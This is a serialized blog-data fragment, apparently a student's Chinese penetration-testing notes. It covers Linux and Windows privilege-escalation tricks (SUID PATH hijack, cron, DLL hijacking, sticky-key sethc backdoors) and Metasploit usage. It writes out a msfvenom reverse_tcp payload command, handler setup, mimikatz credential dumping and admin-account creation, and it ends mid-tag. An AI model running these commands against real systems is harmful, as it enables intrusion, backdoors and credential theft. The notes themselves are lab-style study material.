19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"渗透测试提权",tag:["渗透测试"],categories:["渗透测试","提权","歪比八卜"]},excerpt:"",headers:[{level:2,title:"提权篇",slug:"提权篇",children:[{level:3,title:"内核漏洞提权",slug:"内核漏洞提权",children:[]},{level:3,title:"Suid提权",slug:"suid提权",children:[]},{level:3,title:"GNU C library动态链接区$ORIGIN溢出提权",slug:"gnu-c-library动态链接区-origin溢出提权",children:[]},{level:3,title:"LINUX CRON JOBS提权",slug:"linux-cron-jobs提权",children:[]},{level:3,title:"Lpk提权",slug:"lpk提权",children:[]},{level:3,title:"zend nc提权",slug:"zend-nc提权",children:[]},{level:3,title:"Zend 反弹shell提权",slug:"zend-反弹shell提权",children:[]},{level:3,title:"Filezilla提权",slug:"filezilla提权",children:[]}]}],git:{}},key:"v-02eb67bd",path:"/penetration/",title:"渗透测试提权",lang:"zh-CN",frontmatter:{date:"2023/5/31 19:57",stick:!1,keyword:"misc,ctfshow",description:"渗透测试",title:"渗透测试提权",tag:["渗透测试"],categories:["渗透测试","提权","歪比八卜"]},excerpt:"",headers:[{level:2,title:"提权篇",slug:"提权篇",children:[{level:3,title:"内核漏洞提权",slug:"内核漏洞提权",children:[]},{level:3,title:"Suid提权",slug:"suid提权",children:[]},{level:3,title:"GNU C library动态链接区$ORIGIN溢出提权",slug:"gnu-c-library动态链接区-origin溢出提权",children:[]},{level:3,title:"LINUX CRON JOBS提权",slug:"linux-cron-jobs提权",children:[]},{level:3,title:"Lpk提权",slug:"lpk提权",children:[]},{level:3,title:"zend nc提权",slug:"zend-nc提权",children:[]},{level:3,title:"Zend 反弹shell提权",slug:"zend-反弹shell提权",children:[]},{level:3,title:"Filezilla提权",slug:"filezilla提权",children:[]}]}],content:'\r\n\r\n\r\n## 提权篇\r\n\r\n一切一切一切的前提是你拿到了基础权限，能rce时\r\n\r\n### 内核漏洞提权\r\n\r\n [内核漏洞exp网](https://www.exploit-db.com/ )\r\n\r\n> 根据内核从网站上找对应的exp 在里面执行\r\n>\r\n> 当然，如果这个漏洞被修复过了，就再找一个，这类漏洞实战中比较少，属于高危漏洞\r\n\r\n### Suid提权 \r\n\r\n> 执行赋予4xxx的可执行文件\r\n\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757864.gif)\r\n>\r\n> Echo $PATH把当前tmp（777）目录增加到环境变量\r\n>\r\n> Export PATH=.:$PATH\r\n>\r\n> 设置了PATH执行cat的时候会优先从当前目录下查找程序。所以4xxx的可执行文件中的cat命令会被劫持，就会转到root用户\r\n>\r\n> 特定SUID参数利用，工具/手工探测后看参数是否被赋予SUID权限\r\n>\r\n> Nmap，Vim，find，Bash，More，Less，Nano，cp等系统命令 在suid可执行文件中使用就会发生劫持\r\n\r\n\r\n\r\n### GNU C library动态链接区$ORIGIN溢出提权\r\n\r\n> [**https://blog.csdn.net/qq_45555226/article/details/125686751**](https://blog.csdn.net/qq_45555226/article/details/125686751)\r\n>\r\n> **/proc/N/fd 包含进程相关的所有的文件描述符**\r\n>\r\n> **LDPRELOAD 在所有其他对象（附加的、用户指定、ELF 共享对象）之前加载，但实际上 LDPRELOAD 并非真的是首先加载，通过利用 LDAUDIT 环境变量可以实现优先于 LD_PRELOAD 加载。**\r\n>\r\n> **劫持预加载动态链接库 LD_AUDIT：**LD_AUDIT="\\$ORIGIN" exec /proc/self/fd/3\r\n>\r\n> 大概懂了但应该不怎么懂，和suid提权有一点像\r\n\r\n### LINUX CRON JOBS提权\r\n\r\n> 大概就是利用 /etc/crontab文件，可以设定系统定期执行的任务。\r\n>\r\n> 对于crontab的一些学习\r\n>\r\n> 首先 vi /etc/crontab添加定时执行任务（需要root权限）\r\n>\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757868.gif)\r\n>\r\n> 设定细节看链接https://blog.csdn.net/qq_41969358/article/details/87892343\r\n>\r\n> 注意python文件的文件格式\r\n>\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757870.gif)\r\n>\r\n> 如果用xftp传过去的话格式为doc 运行就会提示权限不够 所以需要修改fileformat=unix nnd找了好久\r\n>\r\n> 然后因为1.py是存在tmp（777）下的  达到提权\r\n>\r\n>  \r\n>\r\n> **![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757838.gif)**\r\n>\r\n> **给dash加上**\r\n>\r\n> **![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757863.gif)**\r\n>\r\n> 在普通用户下使用dash能做到在dash中提权\r\n>\r\n> Dash提权一般用于Ubuntu，主要Windows的定时系统\r\n\r\n### Lpk提权 \r\n\r\n> 仅用于Windows2003 和xp系统 \r\n\r\n> 在window2003或windowxp存在开机自启应用时,例如WebMail \r\n>\r\n> 且该目录中存在exe和lpk.dll时,每当重启电脑,或者电脑开机时,exe执行,调用了假的lpk.dll时就会被劫持。\r\n>\r\n> ![image-20230601191622884](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306011916067.png)T00ls Lpk Sethc v4生成lpk dll文件的工具，利用这个工具就可以生成后门文件劫持exe(作用是替换sethc（粘滞键))实现提权 \r\n>\r\n> 可以在该软件里自定义热键来唤醒,和密码来登录\r\n>\r\n> 远程链接 按 shirt 五次弹出 Sethc 窗口 同时按着 ctrl a 和 b 就会弹出后门输入密码 123456就能进去里\r\n\r\n### zend nc提权\r\n\r\n> 首先zend是服务器所使用的一个插件,在服务器重启的时候被调用\r\n>\r\n> iis6.0 在启动的时候 或 收回进程重启启动的时候有人访问网站的时候就会加载 dll 文件\r\n>\r\n> 提权方法:\r\n>\r\n> 首先利用Zend_DLL_Hijacking_for_nc.exe 生成相应dll文件,\r\n>\r\n> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306012022607.png" alt="image-20230601202221563" style="zoom:33%;" />\r\n>\r\n> 然后替换掉lib下的原dll文件,然后重启服务器,然后访问网站php网页\r\n>\r\n> 此时就能telnet远程登录服务器了 teletnt 192.168.0.115 4444\r\n>\r\n> 一般都是开防火墙的,可能这个不太行,所以一般只是在反弹shell不能用的情况下碰碰运气用的\r\n\r\n### Zend 反弹shell提权\r\n\r\n> 原理和前面的差不多\r\n>\r\n> 利用msf文件生成反弹程序（msf见[kali msfconsole命令详解以及靶机攻破实战](https://zhuanlan.zhihu.com/p/604440914)） 然后上传至目标主机服务器内 利用zend工具将dll文件进行生成 并将原dll文件替换 并在kali攻击机上设置监听 当目标服务器有人进行php网站访问时就会被捕获 从而提权\r\n\r\n### Filezilla提权\r\n\r\n> 原理是利用lck端口转发工具 利用filezilla多端口远程登录 达到可以修改filezilla共享的文件夹内的文件 配合其他手段达到提权 下文就是利用cmd.exe替换sethe.exe来达到替换粘滞键提权\r\n>\r\n> 具体实施过程：\r\n>\r\n> 利用lck端口转发filezilla的14147端口至14148 然后在攻击机上用14148端口登录filezilla 从而修改登录用户或者修改所共享的目录 然后更改目录中C:\\WINDOWS\\system32 中的sethc.exe（粘滞）修改为cmd进行污染\r\n\r\n>看教程说是粘滞键的一般是sethc.exe,但是此次实验中有多个不一样的，遇到这种问题，那就开了粘滞键看进程是哪一个在执行，替换掉就行了\r\n\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757882.gif)\r\n>\r\n> ![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757662.gif)\r\n>\r\n> 不懂',contentRendered:'<h2 id="提权篇" tabindex="-1"><a class="header-anchor" href="#提权篇" aria-hidden="true">#</a> 提权篇</h2>\n<p>一切一切一切的前提是你拿到了基础权限，能rce时</p>\n<h3 id="内核漏洞提权" tabindex="-1"><a class="header-anchor" href="#内核漏洞提权" aria-hidden="true">#</a> 内核漏洞提权</h3>\n<p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">内核漏洞exp网<ExternalLinkIcon/></a></p>\n<blockquote>\n<p>根据内核从网站上找对应的exp 在里面执行</p>\n<p>当然，如果这个漏洞被修复过了，就再找一个，这类漏洞实战中比较少，属于高危漏洞</p>\n</blockquote>\n<h3 id="suid提权" tabindex="-1"><a class="header-anchor" href="#suid提权" aria-hidden="true">#</a> Suid提权</h3>\n<blockquote>\n<p>执行赋予4xxx的可执行文件</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757864.gif" data="aurora"></p>\n<p>Echo $PATH把当前tmp（777）目录增加到环境变量</p>\n<p>Export PATH=.:$PATH</p>\n<p>设置了PATH执行cat的时候会优先从当前目录下查找程序。所以4xxx的可执行文件中的cat命令会被劫持，就会转到root用户</p>\n<p>特定SUID参数利用，工具/手工探测后看参数是否被赋予SUID权限</p>\n<p>Nmap，Vim，find，Bash，More，Less，Nano，cp等系统命令 在suid可执行文件中使用就会发生劫持</p>\n</blockquote>\n<h3 id="gnu-c-library动态链接区-origin溢出提权" tabindex="-1"><a class="header-anchor" href="#gnu-c-library动态链接区-origin溢出提权" aria-hidden="true">#</a> GNU C library动态链接区$ORIGIN溢出提权</h3>\n<blockquote>\n<p><a href="https://blog.csdn.net/qq_45555226/article/details/125686751" target="_blank" rel="noopener noreferrer"><strong>https://blog.csdn.net/qq_45555226/article/details/125686751</strong><ExternalLinkIcon/></a></p>\n<p><strong>/proc/N/fd 包含进程相关的所有的文件描述符</strong></p>\n<p><strong>LDPRELOAD 在所有其他对象（附加的、用户指定、ELF 共享对象）之前加载，但实际上 LDPRELOAD 并非真的是首先加载，通过利用 LDAUDIT 环境变量可以实现优先于 LD_PRELOAD 加载。</strong></p>\n<p>**劫持预加载动态链接库 LD_AUDIT：**LD_AUDIT=&quot;$ORIGIN&quot; exec /proc/self/fd/3</p>\n<p>大概懂了但应该不怎么懂，和suid提权有一点像</p>\n</blockquote>\n<h3 id="linux-cron-jobs提权" tabindex="-1"><a class="header-anchor" href="#linux-cron-jobs提权" aria-hidden="true">#</a> LINUX CRON JOBS提权</h3>\n<blockquote>\n<p>大概就是利用 /etc/crontab文件，可以设定系统定期执行的任务。</p>\n<p>对于crontab的一些学习</p>\n<p>首先 vi /etc/crontab添加定时执行任务（需要root权限）</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757868.gif" data="aurora"></p>\n<p>设定细节看链接https://blog.csdn.net/qq_41969358/article/details/87892343</p>\n<p>注意python文件的文件格式</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757870.gif" data="aurora"></p>\n<p>如果用xftp传过去的话格式为doc 运行就会提示权限不够 所以需要修改fileformat=unix nnd找了好久</p>\n<p>然后因为1.py是存在tmp（777）下的  达到提权</p>\n<p><strong><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757838.gif" data="aurora"></strong></p>\n<p><strong>给dash加上</strong></p>\n<p><strong><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757863.gif" data="aurora"></strong></p>\n<p>在普通用户下使用dash能做到在dash中提权</p>\n<p>Dash提权一般用于Ubuntu，主要Windows的定时系统</p>\n</blockquote>\n<h3 id="lpk提权" tabindex="-1"><a class="header-anchor" href="#lpk提权" aria-hidden="true">#</a> Lpk提权</h3>\n<blockquote>\n<p>仅用于Windows2003 和xp系统</p>\n</blockquote>\n<blockquote>\n<p>在window2003或windowxp存在开机自启应用时,例如WebMail</p>\n<p>且该目录中存在exe和lpk.dll时,每当重启电脑,或者电脑开机时,exe执行,调用了假的lpk.dll时就会被劫持。</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230601191622884" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306011916067.png" data="aurora">T00ls Lpk Sethc v4生成lpk dll文件的工具，利用这个工具就可以生成后门文件劫持exe(作用是替换sethc（粘滞键))实现提权</p>\n<p>可以在该软件里自定义热键来唤醒,和密码来登录</p>\n<p>远程链接 按 shirt 五次弹出 Sethc 窗口 同时按着 ctrl a 和 b 就会弹出后门输入密码 123456就能进去里</p>\n</blockquote>\n<h3 id="zend-nc提权" tabindex="-1"><a class="header-anchor" href="#zend-nc提权" aria-hidden="true">#</a> zend nc提权</h3>\n<blockquote>\n<p>首先zend是服务器所使用的一个插件,在服务器重启的时候被调用</p>\n<p>iis6.0 在启动的时候 或 收回进程重启启动的时候有人访问网站的时候就会加载 dll 文件</p>\n<p>提权方法:</p>\n<p>首先利用Zend_DLL_Hijacking_for_nc.exe 生成相应dll文件,</p>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306012022607.png" alt="image-20230601202221563" style="zoom:33%;" />\n<p>然后替换掉lib下的原dll文件,然后重启服务器,然后访问网站php网页</p>\n<p>此时就能telnet远程登录服务器了 teletnt 192.168.0.115 4444</p>\n<p>一般都是开防火墙的,可能这个不太行,所以一般只是在反弹shell不能用的情况下碰碰运气用的</p>\n</blockquote>\n<h3 id="zend-反弹shell提权" tabindex="-1"><a class="header-anchor" href="#zend-反弹shell提权" aria-hidden="true">#</a> Zend 反弹shell提权</h3>\n<blockquote>\n<p>原理和前面的差不多</p>\n<p>利用msf文件生成反弹程序（msf见<a href="https://zhuanlan.zhihu.com/p/604440914" target="_blank" rel="noopener noreferrer">kali msfconsole命令详解以及靶机攻破实战<ExternalLinkIcon/></a>） 然后上传至目标主机服务器内 利用zend工具将dll文件进行生成 并将原dll文件替换 并在kali攻击机上设置监听 当目标服务器有人进行php网站访问时就会被捕获 从而提权</p>\n</blockquote>\n<h3 id="filezilla提权" tabindex="-1"><a class="header-anchor" href="#filezilla提权" aria-hidden="true">#</a> Filezilla提权</h3>\n<blockquote>\n<p>原理是利用lck端口转发工具 利用filezilla多端口远程登录 达到可以修改filezilla共享的文件夹内的文件 配合其他手段达到提权 下文就是利用cmd.exe替换sethe.exe来达到替换粘滞键提权</p>\n<p>具体实施过程：</p>\n<p>利用lck端口转发filezilla的14147端口至14148 然后在攻击机上用14148端口登录filezilla 从而修改登录用户或者修改所共享的目录 然后更改目录中C:\\WINDOWS\\system32 中的sethc.exe（粘滞）修改为cmd进行污染</p>\n</blockquote>\n<blockquote>\n<p>看教程说是粘滞键的一般是sethc.exe,但是此次实验中有多个不一样的，遇到这种问题，那就开了粘滞键看进程是哪一个在执行，替换掉就行了</p>\n</blockquote>\n<blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757882.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757662.gif" data="aurora"></p>\n<p>不懂</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/penetration/",pathLocale:"/",permalink:null,routeMeta:{},slug:"README",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/penetration/README.md",filePathRelative:"penetration/README.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/index.html.vue",componentFilePathRelative:"pages/penetration/index.html.vue",componentFileChunkName:"v-02eb67bd",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/penetration/index.html.js",dataFilePathRelative:"pages/penetration/index.html.js",dataFileChunkName:"v-02eb67bd",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/penetration/index.html",htmlFilePathRelative:"penetration/index.html"},{data:{key:"v-ab2961b0",path:"/readme/",title:"写在建站之初",lang:"zh-CN",frontmatter:{date:"2023/5/19 16:49",stick:!1,keyword:"建站,建站",description:"没啥好描述的",title:"写在建站之初",tag:["first"],categories:["稀里糊涂","歪比八卜"]},excerpt:"",headers:[],git:{}},key:"v-ab2961b0",path:"/readme/",title:"写在建站之初",lang:"zh-CN",frontmatter:{date:"2023/5/19 16:49",stick:!1,keyword:"建站,建站",description:"没啥好描述的",title:"写在建站之初",tag:["first"],categories:["稀里糊涂","歪比八卜"]},excerpt:"",headers:[],content:"\n\n\n# 写在建站之初的一些话\n\n>写这个博客希望督促自己能抓紧剩下的几年大学时间多去学习新知识了\n>\n>总感觉落下太多了\n>\n>慢慢写，慢慢更\n>\n>加油！！！！！\n>\n>页面用了这个主题[Aurora](https://www.npmjs.com/package/vuepress-theme-aurora)小推\n\n",contentRendered:'<h1 id="写在建站之初的一些话" tabindex="-1"><a class="header-anchor" href="#写在建站之初的一些话" aria-hidden="true">#</a> 写在建站之初的一些话</h1>\n<blockquote>\n<p>写这个博客希望督促自己能抓紧剩下的几年大学时间多去学习新知识了</p>\n<p>总感觉落下太多了</p>\n<p>慢慢写，慢慢更</p>\n<p>加油！！！！！</p>\n<p>页面用了这个主题<a href="https://www.npmjs.com/package/vuepress-theme-aurora" target="_blank" rel="noopener noreferrer">Aurora<ExternalLinkIcon/></a>小推</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/readme/",pathLocale:"/",permalink:null,routeMeta:{},slug:"README",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/readme/README.md",filePathRelative:"readme/README.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/readme/index.html.vue",componentFilePathRelative:"pages/readme/index.html.vue",componentFileChunkName:"v-ab2961b0",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/readme/index.html.js",dataFilePathRelative:"pages/readme/index.html.js",dataFileChunkName:"v-ab2961b0",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/readme/index.html",htmlFilePathRelative:"readme/index.html"},{data:{key:"v-811949f4",path:"/tool/1.html",title:"相关工具使用（未整理版）",lang:"zh-CN",frontmatter:{date:"2023/7/5 19:57",stick:!1,keyword:"misc,ctfshow",description:null,title:"相关工具使用（未整理版）",tag:["相关工具使用"],categories:["渗透测试","misc","web"]},excerpt:"",headers:[{level:2,title:"反弹加提权的一般步骤",slug:"反弹加提权的一般步骤",children:[]},{level:2,title:"后渗透",slug:"后渗透",children:[{level:3,title:"模块利用",slug:"模块利用",children:[]},{level:3,title:"cmd命令",slug:"cmd命令",children:[]}]},{level:2,title:"文件格式",slug:"文件格式",children:[{level:3,title:"文件头和文件尾",slug:"文件头和文件尾",children:[]}]}],git:{}},key:"v-811949f4",path:"/tool/1.html",title:"相关工具使用（未整理版）",lang:"zh-CN",frontmatter:{date:"2023/7/5 19:57",stick:!1,keyword:"misc,ctfshow",description:null,title:"相关工具使用（未整理版）",tag:["相关工具使用"],categories:["渗透测试","misc","web"]},excerpt:"",headers:[{level:2,title:"反弹加提权的一般步骤",slug:"反弹加提权的一般步骤",children:[]},{level:2,title:"后渗透",slug:"后渗透",children:[{level:3,title:"模块利用",slug:"模块利用",children:[]},{level:3,title:"cmd命令",slug:"cmd命令",children:[]}]},{level:2,title:"文件格式",slug:"文件格式",children:[{level:3,title:"文件头和文件尾",slug:"文件头和文件尾",children:[]}]}],content:"\r\n \r\n\r\n# Audacity\r\n\r\n音频处理软件，常用于查看音频隐写，类似摩斯密码等\r\n\r\n首先打开文件，然后观察是否有多个音轨，然后观察音轨中是否有摩斯密码等相关的信息（长短）\r\n\r\n![image-20230724144117152](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241441432.png)\r\n\r\n然后对照这翻译\r\n\r\n![image-20230724144501063](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241445142.png)\r\n\r\n# msf的使用\r\n\r\n```\r\nKali中MSF中session相关命令：\r\n\r\nsessions    –h 查看帮助\r\nsessions \t-i <ID值>  #进入会话  \r\n\r\n \t\t\t-k  杀死会话\t\r\nbackground  #将当前会话放置后台\r\nrun  \t\t#执行已有的模块，输入run后按两下tab，列出已有的脚本\r\ninfo\t    #查看已有模块信息\r\ngetuid \t\t#查看权限 \r\ngetpid \t\t#获取当前进程的pid\r\nsysinfo \t#查看目标机系统信息\r\nps \t\t\t#查看当前活跃进程   \r\n\r\nkill \t\t#<PID值> 杀死进程\r\nidletime \t#查看目标机闲置时间\r\nreboot\t\t#重启\r\nshutdown   \t#关机\r\nshell \t\t#进入目标机CMD窗口\r\n```\r\n\r\n## 反弹加提权的一般步骤\r\n\r\n首先先用msfvenom生成攻击载荷\r\n\r\n`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.109 lport=12345 -f exe >s.exe`\r\n\r\n上传载荷致服务器端，要选一个可以执行的目录文件，用wt.asp先扫一遍目录先看看\r\n\r\n然后拿ASPXSpy2014.aspx（admin）执行文件\r\n\r\n![image-20230726111408035](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261114178.png)\r\n\r\n在此之前先开启监听\r\n\r\n`msfconsole`\r\n\r\n`use exploit/multi/handler`\r\n\r\n`set payload windows/meterpreter/reverse_tcp`\r\n\r\n`set lhost 192.168.x.x`\r\n\r\n`set lport xx ()随便空端口号就行)`\r\n\r\n`run`\r\n\r\n![image-20230724145454737](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512384.png)\r\n\r\n等待上线\r\n\r\n上线以后检测提权的漏洞 \r\n\r\n`use post/multi/recon/local_exploit_suggester`\r\n\r\n`set session 1`\r\n\r\n`run`\r\n\r\n有可能会提示检测中途断开，更新一下msf\r\n\r\n看一下能用的漏洞模块\r\n\r\n![image-20230725220840944](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512838.png)\r\n\r\n利用一下，提权完毕\r\n\r\n![image-20230725221029006](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261509599.png)\r\n\r\n## 后渗透\r\n\r\n后渗透就感觉很刑了\r\n\r\n多个方法玩转主机\r\n\r\nhelp查看能用的功能 但是呢这种英文版肯定是不适合我这种废物的\r\n\r\n所以呢肯定得搞一个中文版看看[(Meterpreter命令详解）](https://blog.csdn.net/weixin_45605352/article/details/115824811)\r\n\r\n![image-20230726153009757](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261530835.png)\r\n\r\n要是进了shell发现奇奇怪怪的玄学问题那也只好全部关掉重新抓个进去用了\r\n\r\nmeterpreter 是可以加载很多模块进行利用的\r\n\r\n### 模块利用\r\n\r\n我是先学了**kiwi**模块\r\n\r\n这个首先得load kiwi加载模块\r\n\r\n其次得关注一下系统的架构 64x的要把进程迁到64x进程中 kiwi默认实现32x的\r\n\r\nsysinfo看系统信息\r\n\r\nps看进程 \r\n\r\nmigrate [PID]换进程\r\n\r\n具体可以参考[MSF中kiwi(mimikatz)模块的使用](https://blog.csdn.net/weixin_45588247/article/details/119497964)\r\n\r\n这个是shell中主机操作 [后渗透主机操作_渗透后控制主机_](https://chenchena.blog.csdn.net/article/details/124493550)用来关关防火墙，远控桌面\r\n\r\n### cmd命令\r\n\r\n补一条拿了管理员权限增加用户命令\r\n\r\nnet user [name] [paaswd] /add #增加用户\r\n\r\nnet localgroup #查看计算机本地组用户，看一下什么是有管理员权限的\r\n\r\nnet user [name]# 用于查看用户的相关信息，可以看用户组的改变\r\n\r\nnet localgroup Adminstrators(组) [name] /add\r\n\r\n\r\n\r\n## 文件格式\r\n\r\n### 文件头和文件尾\r\n\r\n```\r\nJPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　\r\nPNG (png)，            　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82\r\nGIF (gif)，              　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                 ZIP Archive (zip)，           文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B\r\n\r\nTIFF (tif)，              　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：\r\nWindows Bitmap (bmp)，      文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：\r\nCAD (dwg)，               文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：\r\nAdobe Photoshop (psd)，      文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：\r\nRich Text Format (rtf)，       文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：\r\nXML (xml)，                文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：\r\nHTML (html)，              文件头：68746D6C3E\r\nEmail [thorough only] (eml)，   文件头：44656C69766572792D646174653A\r\nOutlook Express (dbx)，       文件头：CFAD12FEC5FD746F\r\nOutlook (pst)，             文件头：2142444E\r\nMS Word/Excel (xls.or.doc)，    文件头：D0CF11E0\r\nMS Access (mdb)，           文件头：5374616E64617264204A\r\nWordPerfect (wpd)，          文件头：FF575043\r\nAdobe Acrobat (pdf)，        文件头：255044462D312E\r\nQuicken (qdf)，             文件头：AC9EBD8F\r\nWindows Password (pwl)，     文件头：E3828596\r\n\r\nRAR Archive (rar)，           文件头：52617221\r\nWave (wav)，               文件头：57415645\r\nAVI (avi)，                 文件头：41564920\r\nReal Audio (ram)，           文件头：2E7261FD\r\nReal Media (rm)，            文件头：2E524D46\r\nMPEG (mpg)，              文件头：000001BA\r\nMPEG (mpg)，              文件头：000001B3\r\nQuicktime (mov)，           文件头：6D6F6F76\r\nWindows Media (asf)，        文件头：3026B2758E66CF11\r\nMIDI (mid)，                文件头：4D546864\r\n```\r\n\r\n",contentRendered:'<h1 id="audacity" tabindex="-1"><a class="header-anchor" href="#audacity" aria-hidden="true">#</a> Audacity</h1>\n<p>音频处理软件，常用于查看音频隐写，类似摩斯密码等</p>\n<p>首先打开文件，然后观察是否有多个音轨，然后观察音轨中是否有摩斯密码等相关的信息（长短）</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724144117152" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241441432.png" data="aurora"></p>\n<p>然后对照这翻译</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724144501063" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241445142.png" data="aurora"></p>\n<h1 id="msf的使用" tabindex="-1"><a class="header-anchor" href="#msf的使用" aria-hidden="true">#</a> msf的使用</h1>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Kali中MSF中session相关命令：\n\nsessions    –h 查看帮助\nsessions \t-i &lt;ID值>  #进入会话  \n\n \t\t\t-k  杀死会话\t\nbackground  #将当前会话放置后台\nrun  \t\t#执行已有的模块，输入run后按两下tab，列出已有的脚本\ninfo\t    #查看已有模块信息\ngetuid \t\t#查看权限 \ngetpid \t\t#获取当前进程的pid\nsysinfo \t#查看目标机系统信息\nps \t\t\t#查看当前活跃进程   \n\nkill \t\t#&lt;PID值> 杀死进程\nidletime \t#查看目标机闲置时间\nreboot\t\t#重启\nshutdown   \t#关机\nshell \t\t#进入目标机CMD窗口\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="反弹加提权的一般步骤" tabindex="-1"><a class="header-anchor" href="#反弹加提权的一般步骤" aria-hidden="true">#</a> 反弹加提权的一般步骤</h2>\n<p>首先先用msfvenom生成攻击载荷</p>\n<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.109 lport=12345 -f exe &gt;s.exe</code></p>\n<p>上传载荷致服务器端，要选一个可以执行的目录文件，用wt.asp先扫一遍目录先看看</p>\n<p>然后拿ASPXSpy2014.aspx（admin）执行文件</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230726111408035" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261114178.png" data="aurora"></p>\n<p>在此之前先开启监听</p>\n<p><code>msfconsole</code></p>\n<p><code>use exploit/multi/handler</code></p>\n<p><code>set payload windows/meterpreter/reverse_tcp</code></p>\n<p><code>set lhost 192.168.x.x</code></p>\n<p><code>set lport xx ()随便空端口号就行)</code></p>\n<p><code>run</code></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230724145454737" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512384.png" data="aurora"></p>\n<p>等待上线</p>\n<p>上线以后检测提权的漏洞</p>\n<p><code>use post/multi/recon/local_exploit_suggester</code></p>\n<p><code>set session 1</code></p>\n<p><code>run</code></p>\n<p>有可能会提示检测中途断开，更新一下msf</p>\n<p>看一下能用的漏洞模块</p>\n<p><img 